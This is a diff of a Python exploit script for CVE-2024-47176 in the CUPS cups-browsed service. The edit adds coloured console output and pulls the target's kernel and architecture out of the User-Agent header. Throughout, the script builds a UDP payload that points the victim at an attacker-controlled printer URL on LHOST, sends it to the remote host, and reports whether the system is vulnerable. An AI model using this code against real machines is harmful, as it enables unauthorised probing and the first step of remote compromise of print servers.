@@ -4,21 +4,23 @@ import socket
 
 def verify(data, printerName):
     headers = data.split('\n')
-    print(f"[CVE_2024_47176] Evaluating Header:  {headers[0]}")
-    print(f"[CVE_2024_47176] Target System Version:  {headers[4]}")
+    print(f"\033[93m[CVE_2024_47176]\033[37m Evaluating Header:  {headers[0]}")
+    for header in headers:
+        if "User-Agent" in header:
+            print(f'\033[93m[CVE_2024_47176]\033[37m Target Machine Kernal & Architecture:  {header.replace('User-Agent: ','')}')
 
     if(printerName in headers[0]):
-        print(f"[CVE_2024_47176] SYSTEM VULNERABLE!")
+        print(f"\033[93m[CVE_2024_47176]\033[37m SYSTEM VULNERABLE!")
         return True
     else:
-        print(f"[CVE_2024_47176] SYSTEM DOES NOT SEEM TO BE VULNERABLE")        
+        print(f"\033[93m[CVE_2024_47176]\033[37m SYSTEM DOES NOT SEEM TO BE VULNERABLE")        
         return False
 
 
 def initiate(RHOST, RPORT, LHOST, SVRPORT, printerName):
 
     payload = f"0 3 http://{LHOST}:{SVRPORT}/printers/{printerName}"
-    print(f"[CVE_2024_47176] Prepping Payload:  '{payload}'")
+    print(f"\033[93m[CVE_2024_47176]\033[37m Prepping Payload:  '{payload}'")
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -28,6 +30,6 @@ def initiate(RHOST, RPORT, LHOST, SVRPORT, printerName):
     data = message.encode('utf-8')
 
     sock.sendto(data, recipient_address)
-    print("[CVE_2024_47176] Payload Sent")
-    print("[CVE_2024_47176] Response Can Take A While. Go Get Some coffee")
+    print("\033[93m[CVE_2024_47176]\033[37m Payload Sent")
+    print("\033[93m[CVE_2024_47176]\033[37m Response Can Take A While. Go Get Some coffee")
     sock.close()
